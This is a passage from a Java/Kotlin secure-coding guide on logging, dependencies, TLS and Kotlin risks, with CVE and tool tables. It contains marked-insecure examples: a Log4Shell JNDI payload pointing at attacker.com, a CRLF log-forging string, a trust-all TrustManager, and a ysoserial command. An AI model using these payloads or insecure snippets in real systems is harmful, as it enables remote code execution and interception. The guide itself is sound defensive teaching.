**Vulnerability:** Writing passwords, tokens, PII, or stack traces to log sinks exposes sensitive data. Log injection — inserting CRLF characters (`\r\n`) into logged values — can inject fake log entries, corrupt log parsing, or trigger log management system vulnerabilities. Log4j 1.x and Log4j 2.x pre-2.17.1 are also vulnerable to JNDI-based RCE via logged strings (Log4Shell).

**References:** CWE-312, CWE-532, CWE-117, CVE-2021-44228 (Log4Shell), OWASP Logging Cheat Sheet

### Mandatory Rules

- **Never log passwords, tokens, session IDs, credit card numbers, or PII** — scrub or mask before logging.
- **Sanitize user-controlled values before logging**: replace `\r`, `\n`, and JNDI lookup patterns (`${`) with safe equivalents.
- **Return generic error messages to clients** — log the full exception server-side only.
- **Use Log4j 2.17.1+** — earlier versions evaluate JNDI lookups in log messages.
- **Never use Log4j 1.x** (EOL 2015, no patches available for Log4Shell-class vulns).
- Set **`log4j2.formatMsgNoLookups=true`** or upgrade to disable message lookups entirely.

```java
// ❌ INSECURE — logs password
logger.info("User {} authenticated with password {}", username, password);

// ❌ INSECURE — CRLF injection: attacker inserts fake log entry
String userAgent = request.getHeader("User-Agent");
logger.info("Request from: {}", userAgent);
// userAgent = "Mozilla\r\n2026-01-01 FAKE_ENTRY: admin logged in"

// ❌ INSECURE — Log4j evaluates ${jndi:...} in logged strings (pre-2.17.1)
logger.info("Search query: {}", userQuery);
// userQuery = "${jndi:ldap://attacker.com/exploit}" → RCE

// ✅ SECURE — sanitize log values, mask sensitive data
String safeInput = userInput
    .replace("\r", "\\r")
    .replace("\n", "\\n")
    .replace("${", "\\${");
logger.info("Request parameter: {}", safeInput);

// ✅ SECURE — generic client error, full detail only in server log
try {
    processOrder(orderId);
} catch (Exception e) {
    logger.error("Order processing failed for orderId={}", orderId, e);
    throw new ResponseStatusException(HttpStatus.INTERNAL_SERVER_ERROR,
        "Order processing failed. Please try again.");
}
```

---

## 15. Dependency Management — Maven and Gradle

**Vulnerability:** Transitive dependency vulnerabilities (Log4Shell, Spring4Shell, Text4Shell) propagate invisibly through the dependency tree. Unpinned version ranges and dependency confusion attacks (publishing a malicious package with the same name as an internal artifact) allow supply chain compromise.

**References:** CVE-2021-44228 (Log4Shell via transitive log4j), CVE-2022-22965 (Spring4Shell), CVE-2022-42889 (Text4Shell — Apache Commons Text)

### Mandatory Rules

- **Pin exact versions** in `pom.xml` or `build.gradle` — avoid open-ended version ranges (`[1.0,)`, `latest.release`, `+`).
- **Run `mvn dependency:tree` or `gradle dependencies`** regularly to audit transitive dependencies.
- **Integrate `OWASP Dependency-Check`** in CI — it scans all direct and transitive dependencies against the NVD CVE database.
- **Use a private artifact repository** (Nexus, Artifactory) as a proxy — configure Maven/Gradle to prefer internal mirrors.
- Register internal group IDs (e.g., `com.yourcompany.*`) in Maven Central / Gradle Plugin Portal to prevent dependency confusion.
- **Enable Gradle's dependency verification** (`gradle --write-verification-metadata sha256`) and check `verification-metadata.xml` into source control.

```xml
<!-- ❌ INSECURE — open version range in pom.xml -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>[2.0,)</version>  <!-- May pull vulnerable 2.14.x -->
</dependency>

<!-- ✅ SECURE — pinned version -->
<dependency>
    <groupId>org.apache.logging.log4j</groupId>
    <artifactId>log4j-core</artifactId>
    <version>2.23.1</version>
</dependency>
```

```groovy
// ❌ INSECURE — Gradle dynamic version
implementation 'org.springframework.boot:spring-boot-starter:+'

// ✅ SECURE — Gradle pinned version with BOM
implementation platform('org.springframework.boot:spring-boot-dependencies:3.2.4')
implementation 'org.springframework.boot:spring-boot-starter'  // Version managed by BOM
```

---

## 16. Insecure TLS / HttpsURLConnection

**Vulnerability:** Overriding `TrustManager` to accept all certificates, setting `HostnameVerifier` to always return `true`, or using `SSLSocketFactory` without certificate chain validation disables all TLS security, making the application vulnerable to man-in-the-middle attacks.

**References:** CWE-295, OWASP Transport Layer Protection

### Mandatory Rules

- **Never implement a `TrustManager` that accepts all certificates** (`X509TrustManager` with empty `checkServerTrusted`).
- **Never use `HttpsURLConnection.setDefaultHostnameVerifier((h, s) -> true)`**.
- For custom CA trust (internal PKI), load the CA into a `KeyStore` and configure a `TrustManagerFactory` properly.
- Enforce **TLS 1.2 minimum** — disable TLS 1.0 and 1.1 via JVM system properties or `SSLContext` configuration.
- Set **connection and read timeouts** on all `HttpURLConnection` / `HttpClient` instances.

```java
// ❌ INSECURE — trust all certificates (MITM attack enabled)
TrustManager[] trustAll = { new X509TrustManager() {
    public X509Certificate[] getAcceptedIssuers() { return new X509Certificate[0]; }
    public void checkClientTrusted(X509Certificate[] c, String t) { }
    public void checkServerTrusted(X509Certificate[] c, String t) { }
}};
SSLContext ctx = SSLContext.getInstance("TLS");
ctx.init(null, trustAll, new SecureRandom());
HttpsURLConnection.setDefaultSSLSocketFactory(ctx.getSocketFactory());

// ❌ INSECURE — disable hostname verification
HttpsURLConnection.setDefaultHostnameVerifier((hostname, session) -> true);

// ✅ SECURE — custom CA via properly configured TrustManagerFactory
KeyStore keyStore = KeyStore.getInstance("JKS");
keyStore.load(new FileInputStream("truststore.jks"), truststorePassword);
TrustManagerFactory tmf = TrustManagerFactory.getInstance(
    TrustManagerFactory.getDefaultAlgorithm());
tmf.init(keyStore);
SSLContext sslCtx = SSLContext.getInstance("TLS");
sslCtx.init(null, tmf.getTrustManagers(), new SecureRandom());

// ✅ SECURE — Java 11+ HttpClient with timeout
HttpClient client = HttpClient.newBuilder()
    .sslContext(sslCtx)
    .connectTimeout(Duration.ofSeconds(5))
    .build();
```

---

## 17. Kotlin-Specific Security Risks

> **Note:** Sections 1–16 apply equally to Java and Kotlin. This section covers risks unique to Kotlin language features.

### 17.1 kotlinx.serialization — @Polymorphic Deserialization

**Vulnerability:** `kotlinx.serialization` with `@Polymorphic` and an open `SerializersModule` can deserialize unexpected subtypes from user-controlled input. Similar in impact to Jackson's `@JsonTypeInfo(use = Id.CLASS)`, an over-permissive module allows attacker-controlled type instantiation. `object` registered via `subclass()` may carry side effects on construction.

**References:** CWE-502, kotlinx.serialization polymorphism documentation

#### Mandatory Rules

- **Prefer `sealed` classes** for polymorphic hierarchies — they restrict subtypes at compile time to a closed set, eliminating the open-world assumption.
- **Never register `@Polymorphic` subtypes dynamically** based on user-supplied class names or reflection.
- If `SerializersModule` is required, **allowlist only the specific known subtypes** — keep the module as narrow as possible.
- Use `Json { serializersModule = strictModule }` rather than the default `Json` instance for untrusted input.

```kotlin
// ❌ INSECURE — open polymorphic hierarchy; SerializersModule may grow unbounded
@Serializable
@Polymorphic
open class Animal

@Serializable @SerialName("cat")
data class Cat(val name: String) : Animal()

// Attacker may inject unknown @type if more subclasses are added carelessly
val module = SerializersModule {
    polymorphic(Animal::class) { subclass(Cat::class) }
}

// ✅ SECURE — sealed class: exhaustive, compile-time closed set
@Serializable
sealed class Animal {
    @Serializable @SerialName("cat")
    data class Cat(val name: String) : Animal()

    @Serializable @SerialName("dog")
    data class Dog(val breed: String) : Animal()
}
// No SerializersModule needed — polymorphism resolved at compile time
val json = Json { }
val animal = json.decodeFromString<Animal>(userInput) // Only Cat or Dog possible
```

---

### 17.2 data class — Sensitive Field Exposure via toString()

**Vulnerability:** Kotlin `data class` auto-generates `toString()`, `equals()`, and `hashCode()` that include **all** constructor parameters. A `data class` with `password`, `token`, `apiKey`, or PII fields will expose those values in log statements, exception messages, and debug output — even if never explicitly logged.

**References:** CWE-312, CWE-532, OWASP Logging Cheat Sheet

#### Mandatory Rules

- **Never place security-sensitive fields** (passwords, tokens, keys, SSNs, card numbers) in a `data class` constructor without explicitly overriding `toString()`.
- **Override `toString()`** to return a redacted string for any `data class` that holds sensitive data.
- Consider using a **`value class`** to wrap sensitive types — it allows custom `toString()` enforcement at the type level.
- Audit all `data class` definitions for sensitive field names as part of code review.

```kotlin
// ❌ INSECURE — auto-generated toString() leaks password to every log statement
data class UserCredentials(
    val username: String,
    val password: String,   // Leaked: "UserCredentials(username=alice, password=s3cr3t!)"
    val apiKey: String      // Leaked: "apiKey=sk-prod-..."
)
logger.info("Processing: $credentials") // Full credential exposure

// ✅ SECURE — override toString() to mask sensitive fields
data class UserCredentials(
    val username: String,
    private val password: String,
    private val apiKey: String
) {
    override fun toString() = "UserCredentials(username=$username, password=***, apiKey=***)"
}

// ✅ SECURE — value class enforces redaction at the type level
@JvmInline
value class ApiKey(private val raw: String) {
    override fun toString() = "ApiKey(***)"
    fun value(): String = raw // Only called explicitly in authorized code
}
```

---

### 17.3 !! Not-Null Assertion as Security Anti-Pattern

**Vulnerability:** The `!!` operator throws `NullPointerException` (with an internal stack trace) instead of a controlled application error. When used on user-controlled nullable values, it can expose internal paths via error messages, bypass exception handlers that only catch `IllegalArgumentException`, and crash threads without meaningful context.

**References:** CWE-476, CWE-209

#### Mandatory Rules

- **Never use `!!` on values derived from external input** — request parameters, deserialized fields, database results, or configuration values.
- Use **`requireNotNull(value) { "Descriptive error" }`** for mandatory internal values — produces `IllegalArgumentException` with a controlled message.
- Use **safe call chains (`?.`)** with explicit fallback (`?: throw ResponseStatusException(...)`) for user-facing validation.
- Configure a global exception handler that converts `NullPointerException` to a generic 500 without stack traces.

```kotlin
// ❌ INSECURE — NullPointerException exposes stack trace if param is missing
val userId = request.getParameter("userId")!!.toLong()

// ❌ INSECURE — ClassCastException bypasses type-safe validation
val token = session.getAttribute("auth_token") as String // Crashes with full trace

// ✅ SECURE — controlled validation with informative ApplicationException
val userId = request.getParameter("userId")
    ?.toLongOrNull()
    ?: throw ResponseStatusException(HttpStatus.BAD_REQUEST, "userId is required")

// ✅ SECURE — safe cast with explicit error
val token = session.getAttribute("auth_token") as? String
    ?: throw ResponseStatusException(HttpStatus.UNAUTHORIZED, "Session invalid")
```

---

### 17.4 Coroutines and Spring Security Context Propagation

**Vulnerability:** Spring Security stores authentication in `ThreadLocal`. Kotlin coroutines suspend and resume on different threads, silently losing the `ThreadLocal` context. Code that reads `SecurityContextHolder.getContext()` after a `suspend` point may receive an empty or wrong context — enabling privilege confusion or silent authorization bypasses that are very hard to reproduce in testing.

**References:** CWE-362, Spring Security reference: Coroutine Support

#### Mandatory Rules

- **Add `kotlinx-coroutines-reactor`** to the classpath — Spring Boot's `WebFlux` + this library propagates the `ReactorContext` (including Security) across coroutine suspensions automatically.
- **Prefer `@PreAuthorize` / `@PostAuthorize` AOP annotations** for authorization — they run before/after the suspend point, not within it.
- **Inject `@AuthenticationPrincipal`** as a method parameter — Spring resolves it before coroutine execution starts, making it safe to use inside suspended code.
- **Never read `SecurityContextHolder.getContext()` inside a `withContext(Dispatchers.IO)` block** without explicit context passing.

```kotlin
// ❌ INSECURE — SecurityContextHolder returns null/wrong context after suspension
@GetMapping("/data")
suspend fun getData(): ResponseEntity<Data> {
    val data = withContext(Dispatchers.IO) { repo.findData() }
    // Thread changed after suspension — context may be null
    val user = SecurityContextHolder.getContext().authentication?.name
        ?: throw AccessDeniedException("Not authenticated") // May fail spuriously
    return ResponseEntity.ok(data.filter { it.owner == user })
}

// ✅ SECURE — inject principal before suspension; use @PreAuthorize
@GetMapping("/data")
@PreAuthorize("isAuthenticated()") // Evaluated before coroutine starts
suspend fun getData(
    @AuthenticationPrincipal principal: UserDetails // Resolved before suspension
): ResponseEntity<Data> {
    val data = withContext(Dispatchers.IO) {
        repo.findDataForUser(principal.username) // Safe: principal captured before suspend
    }
    return ResponseEntity.ok(data)
}

// build.gradle.kts — required for automatic context propagation
// implementation("org.jetbrains.kotlinx:kotlinx-coroutines-reactor:1.8.0")
```

---

### 17.5 object Singleton — Mutable Shared State

**Vulnerability:** Kotlin `object` declarations are JVM singletons. Mutable state stored in an `object` (collections, flags, counters) is shared across all requests and threads. Race conditions on security-relevant state — a blocklist, a rate-limit counter, an active-session set — can allow bypasses if not properly synchronized.

**References:** CWE-362, CWE-667

#### Mandatory Rules

- **Never store mutable, security-relevant state** (blocklists, rate-limit counters, active tokens) in a plain `object` without thread-safe data structures.
- Use `ConcurrentHashMap`, `AtomicLong`, or `AtomicReference` for shared counters and maps in `object` singletons.
- Prefer **Spring-managed beans** (singleton scope by default) over `object` declarations — Spring's dependency injection integrates with lifecycle and testing, making state easier to reset and audit.

```kotlin
// ❌ INSECURE — mutableSetOf is not thread-safe; race condition bypasses blocklist
object TokenBlocklist {
    private val blocked = mutableSetOf<String>()  // Not thread-safe
    fun block(token: String) { blocked.add(token) }
    fun isBlocked(token: String) = token in blocked // Race: token may appear between add and check
}

// ✅ SECURE — ConcurrentHashMap.newKeySet() is thread-safe
object TokenBlocklist {
    private val blocked: MutableSet<String> = ConcurrentHashMap.newKeySet()
    fun block(token: String) { blocked.add(token) }
    fun isBlocked(token: String): Boolean = blocked.contains(token)
}

// ✅ SECURE (preferred) — Spring singleton bean, injectable and testable
@Service
class TokenBlocklistService {
    private val blocked: MutableSet<String> = ConcurrentHashMap.newKeySet()
    fun block(token: String) { blocked.add(token) }
    fun isBlocked(token: String): Boolean = blocked.contains(token)
}
```

---

### Kotlin Checklist

- [ ] Polymorphic hierarchies in `kotlinx.serialization` use `sealed` classes (not open + `@Polymorphic`)
- [ ] No `SerializersModule` that registers subtypes based on user-controlled input
- [ ] All `data class` types with sensitive fields override `toString()` to redact them
- [ ] No `!!` on values derived from external input — use `requireNotNull()` or safe calls
- [ ] `kotlinx-coroutines-reactor` in classpath for Spring WebFlux + Security propagation
- [ ] Authorization checked via `@PreAuthorize` or `@AuthenticationPrincipal`, not `SecurityContextHolder` after suspension
- [ ] Mutable state in `object` singletons uses thread-safe data structures (`ConcurrentHashMap`, `Atomic*`)
- [ ] Gradle Kotlin DSL does not use dynamic version strings (`+`, `latest.release`)
- [ ] Version Catalog (`libs.versions.toml`) used for centralized version management

---

## CVE Reference Table

| CVE | Severity | Component | Description | Fixed In |
|-----|----------|-----------|-------------|----------|
| CVE-2021-44228 | Critical (10.0) | Apache Log4j 2.x — JNDI Lookup | RCE via `${jndi:ldap://...}` pattern in any logged string; zero-click remote exploitation | Log4j 2.15.0 (partial); 2.17.1 (full) |
| CVE-2021-45046 | Critical (9.0) | Apache Log4j 2.x — JNDI bypass | Bypass of 2.15.0 fix using crafted lookup patterns in Thread Context Map | Log4j 2.16.0 |
| CVE-2022-22965 | Critical (9.8) | Spring Framework — Data Binding (Spring4Shell) | RCE via class.classLoader property binding in Spring MVC on JDK 9+ with Tomcat | Spring 5.3.18, 6.0.x |
| CVE-2022-22963 | Critical (9.8) | Spring Cloud Function — routing expression | RCE via SpEL expression in `spring.cloud.function.routing-expression` HTTP header | Spring Cloud Function 3.1.7, 3.2.3 |
| CVE-2022-22947 | Critical (10.0) | Spring Cloud Gateway — SpEL injection | RCE via SpEL expression in Gateway actuator routes (Actuator must be exposed) | Spring Cloud Gateway 3.1.1, 3.0.7 |
| CVE-2022-42889 | Critical (9.8) | Apache Commons Text — `StringSubstitutor` | RCE via `${script:...}`, `${url:...}`, `${dns:...}` interpolation in user-controlled strings | commons-text 1.10.0 |
| CVE-2021-29505 | High (8.8) | XStream — XML deserialization | RCE via crafted XML exploiting XStream's type-resolution mechanism | XStream 1.4.17 |
| CVE-2019-14540 | Critical (9.8) | Jackson Databind — polymorphic deserialization | RCE via `commons-dbcp` gadget chain with default typing enabled | jackson-databind 2.9.10.1 |
| CVE-2020-9484 | High (7.5) | Apache Tomcat — session persistence | RCE via deserialization of attacker-controlled session file (requires file write access) | Tomcat 9.0.35, 8.5.55 |
| CVE-2021-44832 | Medium (6.6) | Apache Log4j 2.x — remote config | RCE via attacker-controlled logging config URL (requires control of logging configuration) | Log4j 2.17.1 |
| CVE-2022-40149 | High (7.5) | Woodstox — XML parsing (DoS) | DoS via malformed XML causing unbounded processing in the Woodstox StAX parser | Woodstox 6.4.0 |
| CVE-2023-46749 | High (7.5) | Apache Shiro — path traversal | Authentication bypass via path traversal with specific URL encoding patterns | Shiro 1.13.0, 2.0.0-alpha-4 |

---

## Security Checklist

### Deserialization
- [ ] `ObjectInputStream` not used with untrusted data (or `ObjectInputFilter` configured)
- [ ] Global JVM serial filter set via `jdk.serialFilter` system property
- [ ] `XMLDecoder` not used on external data
- [ ] XStream configured with `NoTypePermission.NONE` + explicit allowlist
- [ ] Jackson `defaultTyping` disabled; `@JsonTypeInfo(use = Id.CLASS)` not present on externally-deserialized types
- [ ] Jackson `ObjectMapper` configured with `FAIL_ON_UNKNOWN_PROPERTIES = true`

### JNDI and Log4j
- [ ] Log4j upgraded to 2.17.1+ (Java 8) or 2.12.4+ (Java 7)
- [ ] Log4j 1.x not present in dependency tree
- [ ] `log4j2.formatMsgNoLookups=true` system property set
- [ ] No direct `InitialContext.lookup(userInput)` calls
- [ ] User-controlled strings sanitized (strip `${`) before logging

### Expression Language
- [ ] No SpEL evaluated with user-supplied expression strings
- [ ] `SimpleEvaluationContext` used where SpEL is required with user data
- [ ] Spring Cloud Function and Gateway upgraded to patched versions
- [ ] `@InitBinder` blocks `class.*`, `classLoader.*`, `module.*`

### SQL Injection
- [ ] All JDBC queries use `PreparedStatement` with `?` placeholders
- [ ] JPA/Hibernate use named parameters (`:param`, `?1`)
- [ ] No JPQL/HQL string concatenation with user input
- [ ] Dynamic identifiers (column/table names) validated against allowlist

### XML / XXE
- [ ] `DocumentBuilderFactory` has `disallow-doctype-decl` feature enabled
- [ ] `SAXParserFactory` has external entity features disabled
- [ ] `XMLInputFactory` has `IS_SUPPORTING_EXTERNAL_ENTITIES = false`
- [ ] `TransformerFactory` has `ACCESS_EXTERNAL_DTD` and `ACCESS_EXTERNAL_STYLESHEET` set to `""`

### Cryptography
- [ ] AES/GCM/NoPadding used for symmetric encryption (not ECB, not DES/3DES)
- [ ] Fresh `SecureRandom` IV generated per encryption
- [ ] `SecureRandom` used for all tokens, IVs, nonces (not `java.util.Random`)
- [ ] Passwords hashed with BCrypt, Argon2, or PBKDF2 (not MD5/SHA-1/SHA-256 alone)
- [ ] `MessageDigest.isEqual()` used for HMAC comparisons (timing-safe)

### Path Traversal
- [ ] Paths canonicalized with `toRealPath()` / `toAbsolutePath().normalize()` and base-directory verified
- [ ] Uploaded files renamed to server-generated UUIDs

### TLS
- [ ] No custom `TrustManager` that accepts all certificates
- [ ] No `HostnameVerifier` returning `true` unconditionally
- [ ] Connection and read timeouts set on all HTTP clients

### Spring Security
- [ ] `.anyRequest().authenticated()` used as last rule (deny-by-default)
- [ ] CSRF not disabled for browser-facing endpoints
- [ ] Session fixation protection enabled
- [ ] Actuator endpoints restricted to `health`/`info` without authentication

### Logging
- [ ] No passwords, tokens, or PII in log statements
- [ ] User-controlled values sanitized before logging (strip `${`, CRLF)
- [ ] Generic error messages returned to clients

### Dependencies
- [ ] All versions pinned exactly in `pom.xml` / `build.gradle`
- [ ] OWASP Dependency-Check integrated in CI
- [ ] `mvn dependency:tree` or `gradle dependencies` reviewed for vulnerable transitive deps
- [ ] Private artifact registry configured as primary mirror

---

## Tooling

| Tool | Purpose | Command |
|------|---------|---------|
| [OWASP Dependency-Check](https://owasp.org/www-project-dependency-check/) | CVE scan for Maven/Gradle dependencies | `mvn org.owasp:dependency-check-maven:check` |
| [SpotBugs + Find Security Bugs](https://find-sec-bugs.github.io/) | Static analysis: SQL injection, XXE, deserialization, SSRF | Add to `pom.xml` or Gradle; run as part of build |
| [Semgrep Java rules](https://semgrep.dev/r#java) | Code pattern analysis with Java rulesets | `semgrep --config "p/java"` |
| [Snyk for Java](https://snyk.io/) | Dependency and code vulnerability scanning | `snyk test`, `snyk code test` |
| [Checkmarx / SonarQube](https://www.sonarsource.com/products/sonarqube/) | Enterprise SAST with Java security rules | CI/CD integration |
| [Gitleaks](https://gitleaks.io/) | Secret scanning in Git history | `gitleaks detect --source .` |
| [ysoserial](https://github.com/frohoff/ysoserial) | Gadget chain generator for testing deserialization | `java -jar ysoserial.jar CommonsCollections1 "id"` |
| [JVM serial filter tester](https://openjdk.org/jeps/290) | Verify `ObjectInputFilter` configuration | Manual or JUnit-based test |
| [mvn-versions-plugin](https://www.mojohaus.org/versions-maven-plugin/) | Find outdated Maven dependencies | `mvn versions:display-dependency-updates` |
| [detekt](https://detekt.dev/) | Kotlin static analysis with security rules | `./gradlew detekt` |
| [Semgrep Kotlin rules](https://semgrep.dev/r#kotlin) | Kotlin-specific security pattern analysis | `semgrep --config "p/kotlin"` |

---

*Released under [CC BY-SA 4.0](https://creativecommons.org/licenses/by-sa/4.0/). Based on Oracle Java Security Advisories, Kotlin Security Docs, OWASP Java Security Cheat Sheet, Spring Security Reference, and NIST/MITRE vulnerability data.*
